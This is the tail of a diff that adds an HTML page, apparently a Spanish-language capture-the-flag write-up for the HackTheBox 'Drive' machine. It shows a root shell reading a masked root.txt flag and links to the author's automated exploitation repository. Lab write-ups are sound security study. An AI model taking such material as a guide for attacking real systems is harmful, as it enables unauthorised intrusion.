+<span id="cb38-3"><a href="#cb38-3" aria-hidden="true"></a><span class="ex">bash-5.0</span># cat root.txt</span>
+<span id="cb38-4"><a href="#cb38-4" aria-hidden="true"></a><span class="ex">7f6*****************************</span></span>
+<span id="cb38-5"><a href="#cb38-5" aria-hidden="true"></a><span class="ex">bash-5.0</span># </span></code></pre></div>
+
+<p>Aqui se explica con detalle el <a class="link" href="https://github.com/MrPr1ngl3s/AutoPWN/tree/main/HTB/Drive" target="_blank">AutoPWN</a> de la máquina Drive.</p>
+
+<hr />
+<p>© <script>document.write(new Date().getFullYear());</script> - Mr. Pr1ngl3s</p>
+
+  </div>
+</body>
+</html>
